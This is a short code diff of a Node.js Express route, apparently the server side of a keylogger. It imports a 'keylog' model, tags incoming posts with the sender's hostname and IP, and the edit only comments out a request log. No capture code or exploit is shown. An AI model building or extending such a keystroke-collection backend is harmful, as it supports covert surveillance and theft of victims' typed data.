@@ -5,7 +5,7 @@ var keylog=require('./database').keylog;
 var user=require('./database').user;
 
 router.post('/', function(req, res){
-    console.log(req.body);
+    //console.log(req.body);
     var host=req.body.hostname+"-"+req.body.ip;
     user.find({username:host},function(err,response){
         if(err){
